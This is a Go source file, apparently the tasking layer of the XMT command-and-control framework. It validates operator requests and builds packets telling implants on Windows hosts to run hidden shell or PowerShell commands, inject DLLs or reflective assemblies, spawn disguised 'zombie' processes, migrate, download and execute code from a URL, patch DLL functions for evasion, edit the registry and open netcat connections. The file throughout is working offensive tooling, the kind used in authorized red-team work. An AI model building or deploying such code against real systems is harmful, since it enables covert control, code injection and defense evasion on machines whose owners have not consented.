// Copyright (C) 2020 - 2023 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

package cirrus

import (
	"encoding/json"
	"strings"
	"time"

	"github.com/PurpleSec/routex/val"
	"github.com/iDigitalFlame/xmt/c2/cfg"
	"github.com/iDigitalFlame/xmt/c2/task"
	"github.com/iDigitalFlame/xmt/cmd"
	"github.com/iDigitalFlame/xmt/cmd/filter"
	"github.com/iDigitalFlame/xmt/com"
	"github.com/iDigitalFlame/xmt/device/winapi"
)

var valFilter = val.Validator{
	Name: "filter", Type: val.Object, Optional: true, Rules: val.Rules{
		val.SubSet{
			val.Validator{Name: "pid", Type: val.Int, Optional: true},
			val.Validator{Name: "session", Type: val.Bool, Optional: true},
			val.Validator{Name: "fallback", Type: val.Bool, Optional: true},
			val.Validator{Name: "elevated", Type: val.Bool, Optional: true},
			val.Validator{Name: "exclude", Type: val.ListString, Optional: true},
			val.Validator{Name: "include", Type: val.ListString, Optional: true},
		},
	},
}

var (
	valPullEx = val.Set{
		val.Validator{Name: "show", Type: val.Bool, Optional: true},
		val.Validator{Name: "detach", Type: val.Bool, Optional: true},
		val.Validator{Name: "url", Type: val.String, Rules: val.Rules{val.NoEmpty}},
		valFilter,
	}
	valTaskDLL = val.Set{
		val.Validator{Name: "path", Type: val.String, Optional: true},
		val.Validator{Name: "detach", Type: val.Bool, Optional: true},
		val.Validator{Name: "data", Type: val.String, Optional: true},
		val.Validator{Name: "entry", Type: val.String, Optional: true},
		val.Validator{Name: "reflect", Type: val.Bool, Optional: true},
		valFilter,
	}
	valTaskWTS = val.Set{
		val.Validator{Name: "wait", Type: val.Bool, Optional: true},
		val.Validator{Name: "text", Type: val.String, Optional: true},
		val.Validator{Name: "title", Type: val.String, Optional: true},
		val.Validator{Name: "action", Type: val.String, Rules: val.Rules{val.NoEmpty}},
		val.Validator{Name: "flags", Type: val.Int, Optional: true, Rules: val.Rules{val.Positive}},
		val.Validator{Name: "session", Type: val.Int, Optional: true, Rules: val.Rules{val.Min(-2)}},
		val.Validator{Name: "seconds", Type: val.Int, Optional: true, Rules: val.Rules{val.Positive}},
	}
	valTaskPull = val.Set{
		val.Validator{Name: "url", Type: val.String, Rules: val.Rules{val.NoEmpty}},
	}
	valTaskSpawn = val.Set{
		val.Validator{Name: "payload", Type: val.Any, Optional: true},
		val.Validator{Name: "method", Type: val.String, Optional: true},
		val.Validator{Name: "profile", Type: val.String, Optional: true},
		val.Validator{Name: "name", Type: val.String, Rules: val.Rules{val.NoEmpty}},
		valFilter,
	}
	valTaskLogin = val.Set{
		val.Validator{Name: "pass", Type: val.String, Optional: true},
		val.Validator{Name: "domain", Type: val.String, Optional: true},
		val.Validator{Name: "user", Type: val.String, Rules: val.Rules{val.NoEmpty}},
	}
	valTaskPower = val.Set{
		val.Validator{Name: "force", Type: val.Bool, Optional: true},
		val.Validator{Name: "message", Type: val.String, Optional: true},
		val.Validator{Name: "action", Type: val.String, Rules: val.Rules{val.NoEmpty}},
		val.Validator{Name: "reason", Type: val.Int, Optional: true, Rules: val.Rules{val.Positive}},
		val.Validator{Name: "seconds", Type: val.Int, Optional: true, Rules: val.Rules{val.Positive}},
	}
	valTaskEvade = val.Set{
		val.Validator{Name: "action", Type: val.String, Rules: val.Rules{val.NoEmpty}},
	}
	valTaskZombie = val.Set{
		val.Validator{Name: "show", Type: val.Bool, Optional: true},
		val.Validator{Name: "fake", Type: val.String, Optional: true},
		val.Validator{Name: "detach", Type: val.Bool, Optional: true},
		val.Validator{Name: "user", Type: val.String, Optional: true},
		val.Validator{Name: "pass", Type: val.String, Optional: true},
		val.Validator{Name: "entry", Type: val.String, Optional: true},
		val.Validator{Name: "domain", Type: val.String, Optional: true},
		val.Validator{Name: "data", Type: val.String, Rules: val.Rules{val.NoEmpty}},
		valFilter,
	}
	valTaskScript = val.Set{
		val.Validator{Name: "script", Type: val.String, Rules: val.Rules{val.NoEmpty}},
	}
	valTaskSystem = val.Set{
		val.Validator{Name: "cmd", Type: val.String, Rules: val.Rules{val.NoEmpty}},
		valFilter,
	}
	valTaskSimple = val.Set{
		val.Validator{Name: "show", Type: val.Bool, Optional: true},
		val.Validator{Name: "detach", Type: val.Bool, Optional: true},
		val.Validator{Name: "user", Type: val.String, Optional: true},
		val.Validator{Name: "pass", Type: val.String, Optional: true},
		val.Validator{Name: "stdin", Type: val.String, Optional: true},
		val.Validator{Name: "domain", Type: val.String, Optional: true},
		val.Validator{Name: "timeout", Type: val.String, Optional: true},
		val.Validator{Name: "cmd", Type: val.String, Rules: val.Rules{val.NoEmpty}},
		valFilter,
	}
	valTaskUpload = val.Set{
		val.Validator{Name: "path", Type: val.String, Rules: val.Rules{val.NoEmpty}},
		val.Validator{Name: "data", Type: val.String},
	}
	valTaskNetcat = val.Set{
		val.Validator{Name: "read", Type: val.Bool, Optional: true},
		val.Validator{Name: "data", Type: val.String, Optional: true},
		val.Validator{Name: "protocol", Type: val.String, Optional: true},
		val.Validator{Name: "host", Type: val.String, Rules: val.Rules{val.NoEmpty}},
		val.Validator{Name: "seconds", Type: val.Int, Optional: true, Rules: val.Rules{val.Positive}},
	}
	valTaskProfile = val.Set{
		val.Validator{Name: "profile", Type: val.String, Rules: val.Rules{val.NoEmpty}},
	}
	valTaskMigrate = val.Set{
		val.Validator{Name: "wait", Type: val.Bool, Optional: true},
		val.Validator{Name: "payload", Type: val.Any, Optional: true},
		val.Validator{Name: "method", Type: val.String, Optional: true},
		val.Validator{Name: "profile", Type: val.String, Optional: true},
		val.Validator{Name: "name", Type: val.String, Rules: val.Rules{val.NoEmpty}},
		valFilter,
	}
	valTaskFuncmap = val.Set{
		val.Validator{Name: "raw", Type: val.Bool, Optional: true},
		val.Validator{Name: "data", Type: val.String, Optional: true},
		val.Validator{Name: "function", Type: val.String, Optional: true},
		val.Validator{Name: "action", Type: val.String, Rules: val.Rules{val.NoEmpty}},
	}
	valTaskWindowUI = val.Set{
		val.Validator{Name: "x", Type: val.Int, Optional: true},
		val.Validator{Name: "y", Type: val.Int, Optional: true},
		val.Validator{Name: "width", Type: val.Int, Optional: true},
		val.Validator{Name: "heigh", Type: val.Int, Optional: true},
		val.Validator{Name: "state", Type: val.Any, Optional: true},
		val.Validator{Name: "handle", Type: val.Int, Optional: true},
		val.Validator{Name: "text", Type: val.String, Optional: true},
		val.Validator{Name: "path", Type: val.String, Optional: true},
		val.Validator{Name: "data", Type: val.String, Optional: true},
		val.Validator{Name: "enable", Type: val.Bool, Optional: true},
		val.Validator{Name: "action", Type: val.String, Rules: val.Rules{val.NoEmpty}},
		val.Validator{Name: "flags", Type: val.Int, Optional: true, Rules: val.Rules{val.Positive}},
		val.Validator{Name: "title", Type: val.String, Optional: true, Rules: val.Rules{val.NoEmpty}},
		val.Validator{Name: "seconds", Type: val.Int, Optional: true, Rules: val.Rules{val.Positive}},
		val.Validator{Name: "level", Type: val.Int, Optional: true, Rules: val.Rules{val.Min(0), val.Max(256)}},
	}
	valTaskAssembly = val.Set{
		val.Validator{Name: "detach", Type: val.Bool, Optional: true},
		val.Validator{Name: "entry", Type: val.String, Optional: true},
		val.Validator{Name: "data", Type: val.String, Rules: val.Rules{val.NoEmpty}},
		valFilter,
	}
	valTaskSystemIo = val.Set{
		val.Validator{Name: "force", Type: val.Bool, Optional: true},
		val.Validator{Name: "action", Type: val.String, Rules: val.Rules{val.NoEmpty}},
		val.Validator{Name: "name", Type: val.String, Optional: true, Rules: val.Rules{val.NoEmpty}},
		val.Validator{Name: "path", Type: val.String, Optional: true, Rules: val.Rules{val.NoEmpty}},
		val.Validator{Name: "dest", Type: val.String, Optional: true, Rules: val.Rules{val.NoEmpty}},
		val.Validator{Name: "source", Type: val.String, Optional: true, Rules: val.Rules{val.NoEmpty}},
		val.Validator{Name: "pid", Type: val.Int, Optional: true, Rules: val.Rules{val.GreaterThanZero}},
	}
	valTaskDownload = val.Set{
		val.Validator{Name: "path", Type: val.String, Rules: val.Rules{val.NoEmpty}},
	}
	valTaskRegistry = val.Set{
		val.Validator{Name: "force", Type: val.Bool, Optional: true},
		val.Validator{Name: "type", Type: val.String, Optional: true},
		val.Validator{Name: "data", Type: val.String, Optional: true},
		val.Validator{Name: "value", Type: val.String, Optional: true},
		val.Validator{Name: "key", Type: val.String, Rules: val.Rules{val.NoEmpty}},
		val.Validator{Name: "action", Type: val.String, Rules: val.Rules{val.NoEmpty}},
	}
	valTaskWorkHours = val.Set{
		val.Validator{Name: "day", Type: val.String, Optional: true},
		val.Validator{Name: "end_min", Type: val.Int, Optional: true, Rules: val.Rules{val.Min(0), val.Max(59)}},
		val.Validator{Name: "end_hour", Type: val.Int, Optional: true, Rules: val.Rules{val.Min(0), val.Max(23)}},
		val.Validator{Name: "start_min", Type: val.Int, Optional: true, Rules: val.Rules{val.Min(0), val.Max(59)}},
		val.Validator{Name: "start_hour", Type: val.Int, Optional: true, Rules: val.Rules{val.Min(0), val.Max(23)}},
	}
	valTaskPatchCheck = val.Set{
		val.Validator{Name: "raw", Type: val.Bool, Optional: true},
		val.Validator{Name: "data", Type: val.String, Optional: true},
		val.Validator{Name: "function", Type: val.String, Optional: true},
		val.Validator{Name: "dll", Type: val.String, Rules: val.Rules{val.NoEmpty}},
	}
)

const (
	boolNone  taskBool = 0
	boolTrue  taskBool = 2
	boolFalse taskBool = 1
)

type taskBool uint8
type taskDLL struct {
	Path string `json:"path"`
	Line string `json:"line"`
	taskAssembly
	Reflect taskBool `json:"reflect"`
}
type taskPull struct {
	URL   string `json:"url"`
	Line  string `json:"line"`
	Agent string `json:"agent"`
	taskExecute
}
type taskPower struct {
	_       [0]func()
	Line    string `json:"line"`
	Action  string `json:"action"`
	Message string `json:"message"`
	Reason  uint32 `json:"reason"`
	Seconds uint32 `json:"seconds"`
	Force   bool   `json:"force"`
}
type taskCheck struct {
	DLL      string `json:"dll"`
	Line     string `json:"line"`
	Function string `json:"function"`
	Data     []byte `json:"data"`
	Raw      bool   `json:"raw"`
}
type taskPatch struct {
	taskCheck
}
type taskSpawn struct {
	Filter  *filter.Filter  `json:"filter"`
	Line    string          `json:"line"`
	Name    string          `json:"name"`
	Method  string          `json:"method"`
	Profile string          `json:"profile"`
	Payload json.RawMessage `json:"payload"`
}
type taskZombie struct {
	Line   string `json:"line"`
	Fake   string `json:"fake"`
	User   string `json:"user"`
	Pass   string `json:"pass"`
	Stdin  []byte `json:"stdin"`
	Domain string `json:"domain"`
	taskAssembly
}
type taskSystem struct {
	_       [0]func()
	Filter  *filter.Filter `json:"filter"`
	Line    string         `json:"line"`
	Args    string         `json:"args"`
	Command string         `json:"cmd"`
}
type taskNetcat struct {
	Line     string `json:"line"`
	Host     string `json:"host"`
	Protocol string `json:"protocol"`
	Data     []byte `json:"data"`
	Seconds  uint32 `json:"seconds"`
	Read     bool   `json:"read"`
}
type taskFuncmap struct {
	Action   string `json:"action"`
	Line     string `json:"line"`
	Function string `json:"function"`
	Data     []byte `json:"data"`
	Raw      bool   `json:"raw"`
}
type taskMigrate struct {
	Line string `json:"line"`
	taskSpawn
	Wait taskBool `json:"wait"`
}
type taskCommand struct {
	Line    string `json:"line"`
	User    string `json:"user"`
	Pass    string `json:"pass"`
	Stdin   []byte `json:"stdin"`
	Domain  string `json:"domain"`
	Command string `json:"cmd"`
	taskExecute
}
type taskExecute struct {
	_       [0]func()
	Filter  *filter.Filter `json:"filter"`
	Line    string         `json:"line"`
	Show    taskBool       `json:"show"`
	Detach  taskBool       `json:"detach"`
	Timeout string         `json:"timeout"`
}
type taskAssembly struct {
	Line  string `json:"line"`
	Data  []byte `json:"data"`
	Entry string `json:"entry"`
	taskExecute
}
type taskWorkHours struct {
	_         [0]func()
	Line      string `json:"line"`
	Days      string `json:"days"`
	StartHour uint8  `json:"start_hour"`
	StartMin  uint8  `json:"start_min"`
	EndHour   uint8  `json:"end_hour"`
	EndMin    uint8  `json:"end_min"`
}
type callableTasklet interface {
	task.Callable
	task.Tasklet
}

func (t taskDLL) Packet() (*com.Packet, error) {
	c, err := t.Callable()
	if err != nil {
		return nil, err
	}
	return c.Packet()
}
func (t taskCheck) Packet() (*com.Packet, error) {
	// Raw means DO NOT EXTRACT, IT's RAW ASM
	// - It's not valid when no function is used
	// Only for functions!
	//
	// Raw with empty data and a specific function is special in
	// that is directs us to read the file from the client disk
	//
	// Empty data with a valid function will NOT pull from disk
	// we can read JMP calls.
	//
	// No data and no func means read dll from FS, compare base
	//
	// Else, parse data
	// - if function is valid, extract bytes and do that
	// - else compare base
	if t.Raw {
		if len(t.Function) == 0 {
			return nil, errInvalidRaw
		}
		if len(t.Data) == 0 {
			return task.CheckFunctionFile(t.DLL, t.Function, nil), nil
		}
		return task.CheckFunction(t.DLL, t.Function, t.Data), nil
	}
	if len(t.Data) == 0 && len(t.Function) > 0 {
		return task.CheckFunction(t.DLL, t.Function, nil), nil
	}
	if len(t.Data) == 0 && len(t.Function) == 0 {
		return task.CheckDLLFile(t.DLL), nil
	}
	if len(t.Function) > 0 {
		v, err1 := winapi.ExtractDLLFunctionRaw(t.Data, t.Function, 16)
		if err1 != nil {
			return nil, err1
		}
		return task.CheckFunction(t.DLL, t.Function, v), nil
	}
	a, v, err := winapi.ExtractDLLBaseRaw(t.Data)
	if err != nil {
		return nil, err
	}
	return task.CheckDLL(t.DLL, a, v), nil
}
func (t taskPatch) Packet() (*com.Packet, error) {
	if t.Raw {
		if len(t.Data) == 0 || len(t.Function) == 0 {
			return nil, errInvalidRaw
		}
		return task.PatchFunction(t.DLL, t.Function, t.Data), nil
	}
	if len(t.Data) == 0 && len(t.Function) > 0 {
		return task.PatchFunction(t.DLL, t.Function, nil), nil
	}
	if len(t.Data) == 0 && len(t.Function) == 0 {
		return task.PatchDLLFile(t.DLL), nil
	}
	if len(t.Function) > 0 {
		v, err1 := winapi.ExtractDLLFunctionRaw(t.Data, t.Function, 16)
		if err1 != nil {
			return nil, err1
		}
		return task.PatchFunction(t.DLL, t.Function, v), nil
	}
	a, v, err := winapi.ExtractDLLBaseRaw(t.Data)
	if err != nil {
		return nil, err
	}
	return task.PatchDLL(t.DLL, a, v), nil
}
func (b *taskBool) UnmarshalJSON(d []byte) error {
	if len(d) == 0 {
		*b = boolNone
		return nil
	}
	if d[0] == '"' && len(d) >= 1 {
		switch d[1] {
		case '1', 'T', 't':
			*b = boolTrue
			return nil
		case '0', 'F', 'f':
			*b = boolFalse
			return nil
		}
		*b = boolNone
		return nil
	}
	switch d[0] {
	case '1', 'T', 't':
		*b = boolTrue
		return nil
	case '0', 'F', 'f':
		*b = boolFalse
		return nil
	}
	*b = boolNone
	return nil
}
func (t taskPower) Packet() (*com.Packet, error) {
	switch strings.ToLower(t.Action) {
	case "restart":
		return task.Restart(t.Message, t.Seconds, t.Force, t.Reason), nil
	case "shutdown":
		return task.Shutdown(t.Message, t.Seconds, t.Force, t.Reason), nil
	}
	return nil, errInvalidAction
}
func (t taskNetcat) Packet() (*com.Packet, error) {
	if len(t.Host) == 0 {
		return nil, errInvalidHost
	}
	var p uint8
	switch strings.ToLower(t.Protocol) {
	case "udp":
		p = task.NetcatUDP
	case "tls":
		p = task.NetcatTLS
	case "icmp":
		p = task.NetcatICMP
	case "tcp", "":
		p = task.NetcatTCP
	case "tls-insecure":
		p = task.NetcatTLSInsecure
	default:
		return nil, errInvalidProtocol
	}
	return task.Netcat(t.Host, p, time.Second*time.Duration(t.Seconds), t.Read, t.Data), nil
}
func (t taskZombie) Packet() (*com.Packet, error) {
	d, err := parseDuration(t.Timeout, false)
	if err != nil {
		return nil, err
	}
	return (task.Zombie{
		Data:    cmd.DLLToASM(t.Entry, t.Data),
		Args:    cmd.Split(t.Fake),
		Hide:    t.Show != boolTrue,
		Wait:    t.Detach != boolTrue,
		User:    t.User,
		Pass:    t.Pass,
		Stdin:   t.Stdin,
		Domain:  t.Domain,
		Filter:  t.Filter,
		Timeout: d,
	}).Packet()
}
func (t taskCommand) Packet() (*com.Packet, error) {
	d, err := parseDuration(t.Timeout, false)
	if err != nil {
		return nil, err
	}
	p := task.Process{
		Hide:    t.Show != boolTrue,
		Wait:    t.Detach != boolTrue,
		User:    t.User,
		Pass:    t.Pass,
		Stdin:   t.Stdin,
		Domain:  t.Domain,
		Filter:  t.Filter,
		Timeout: d,
	}
	if len(t.Command) == 0 && len(t.Stdin) == 0 {
		return nil, errInvalidCommand
	}
	switch t.Command[0] {
	case '.':
		if len(t.Command) == 1 {
			p.Args = []string{"@SHELL@"}
		} else {
			p.Args = []string{"@SHELL@", t.Command[1:]}
		}
	case '$':
		if len(t.Command) == 1 {
			p.Args = []string{"@PHELL@"}
		} else {
			p.Args = []string{"@PHELL@", "-nop", "-nol", "-c", t.Command[1:]}
		}
	default:
		p.Args = cmd.Split(t.Command)
	}
	return p.Packet()
}
func (t taskFuncmap) Packet() (*com.Packet, error) {
	switch strings.ToLower(t.Action) {
	case "add":
	case "list", "ls":
		return task.FuncRemapList(), nil
	case "del", "delete", "remove":
		if len(t.Function) == 0 {
			return nil, errInvalidFunction
		}
		return task.FuncUnmap(t.Function), nil
	case "del_all", "delete_all", "remove_all":
		return task.FuncUnmapAll(), nil
	default:
		return nil, errInvalidAction
	}
	if len(t.Data) == 0 {
		return nil, errInvalidData
	}
	if len(t.Function) == 0 {
		return nil, errInvalidFunction
	}
	if t.Raw {
		return task.FuncRemap(t.Function, t.Data), nil
	}
	v, err := winapi.ExtractDLLFunctionRaw(t.Data, t.Function, 16)
	if err != nil {
		return nil, err
	}
	return task.FuncRemap(t.Function, v), nil
}
func (t taskAssembly) Packet() (*com.Packet, error) {
	return (task.Assembly{
		Data:   cmd.DLLToASM(t.Entry, t.Data),
		Wait:   t.Detach != boolTrue,
		Filter: t.Filter,
	}).Packet()
}
func (t taskSpawn) Callable() (task.Callable, error) {
	// NOTE(dij): The created instances are omitting the Filter value as this is
	//            set by the Spawn and Migrate functions when starting up.
	switch strings.ToLower(t.Method) {
	case "":
		return nil, nil
	case "dll":
		var v taskDLL
		if err := json.Unmarshal(t.Payload, &v); err != nil {
			return nil, err
		}
		if len(v.Data) == 0 && len(v.Path) == 0 {
			return nil, errInvalidDataPath
		}
		i, err := v.Callable()
		if err != nil {
			return nil, err
		}
		return i.(task.Callable), nil
	case "asm":
		var v taskAssembly
		if err := json.Unmarshal(t.Payload, &v); err != nil {
			return nil, err
		}
		if len(v.Data) == 0 {
			return nil, errInvalidData
		}
		return task.Assembly{Data: cmd.DLLToASM(v.Entry, v.Data), Wait: v.Detach != boolTrue}, nil
	case "exec":
		var v taskCommand
		if err := json.Unmarshal(t.Payload, &v); err != nil {
			return nil, err
		}
		if len(v.Command) == 0 {
			return nil, errInvalidCommand
		}
		i := task.Process{
			Hide:   v.Show != boolTrue,
			Wait:   v.Detach != boolTrue,
			User:   v.User,
			Pass:   v.Pass,
			Stdin:  v.Stdin,
			Domain: v.Domain,
		}
		switch v.Command[0] {
		case '.':
			i.Args = []string{"@SHELL@", v.Command[1:]}
		case '$':
			i.Args = []string{"@PHELL@", "-nop", "-nol", "-c", v.Command[1:]}
		default:
			i.Args = cmd.Split(v.Command)
		}
		return i, nil
	case "zombie":
		var v taskZombie
		if err := json.Unmarshal(t.Payload, &v); err != nil {
			return nil, err
		}
		if len(v.Data) == 0 {
			return nil, errInvalidData
		}
		if len(v.Fake) == 0 {
			return nil, errInvalidFake
		}
		return task.Zombie{
			Data:   cmd.DLLToASM(v.Entry, v.Data),
			Args:   cmd.Split(v.Fake),
			Hide:   v.Show != boolTrue,
			Wait:   v.Detach != boolTrue,
			User:   v.User,
			Pass:   v.Pass,
			Domain: v.Domain,
		}, nil
	}
	return nil, errInvalidMethod
}
func (t taskDLL) Callable() (callableTasklet, error) {
	d, err := parseDuration(t.Timeout, false)
	if err != nil {
		return nil, err
	}
	if len(t.Path) > 0 {
		return task.DLL{Path: t.Path, Wait: t.Detach != boolTrue, Filter: t.Filter, Timeout: d}, nil
	}
	if t.Reflect == boolTrue {
		return task.Assembly{Data: cmd.DLLToASM(t.Entry, t.Data), Wait: t.Detach != boolTrue, Filter: t.Filter, Timeout: d}, nil
	}
	return task.DLL{Data: t.Data, Wait: t.Detach != boolTrue, Filter: t.Filter, Timeout: d}, nil
}
func (t taskWorkHours) Packet() (*com.Packet, error) {
	d, err := parseDayString(t.Days)
	if err != nil {
		return nil, err
	}
	if t.StartHour > 23 || t.StartMin > 59 || t.EndHour > 23 || t.EndMin > 59 {
		return nil, errInvalidTime
	}
	return task.WorkHours(d, t.StartHour, t.StartMin, t.EndHour, t.EndMin), nil
}
func (t taskSpawn) Packet(p cfg.Config) (*com.Packet, error) {
	if t.Method == "pexec" {
		var m map[string]string
		if err := json.Unmarshal(t.Payload, &m); err == nil && len(m) > 0 {
			u, ok := m["url"]
			if !ok {
				return nil, errInvalidPayload
			}
			return task.SpawnPullProfile(t.Filter, t.Name, p, u, m["agent"]), nil
		}
		var u string
		if err := json.Unmarshal(t.Payload, &u); err != nil {
			return nil, errInvalidPayload
		}
		return task.SpawnPullProfile(t.Filter, t.Name, p, u, ""), nil
	}
	c, err := t.Callable()
	if err != nil {
		return nil, err
	}
	return task.SpawnProfile(t.Filter, t.Name, p, c), nil
}
func (t taskMigrate) Packet(p cfg.Config) (*com.Packet, error) {
	if t.Method == "pexec" {
		var m map[string]string
		if err := json.Unmarshal(t.Payload, &m); err == nil && len(m) > 0 {
			u, ok := m["url"]
			if !ok {
				return nil, errInvalidPayload
			}
			return task.MigratePullProfileEx(t.Filter, t.Wait != boolFalse, t.Name, p, u, m["agent"]), nil
		}
		var u string
		if err := json.Unmarshal(t.Payload, &u); err != nil {
			return nil, errInvalidPayload
		}
		return task.MigratePullProfileEx(t.Filter, t.Wait != boolFalse, t.Name, p, u, ""), nil
	}
	c, err := t.Callable()
	if err != nil {
		return nil, err
	}
	return task.MigrateProfileEx(t.Filter, t.Wait != boolFalse, t.Name, p, c), nil
}
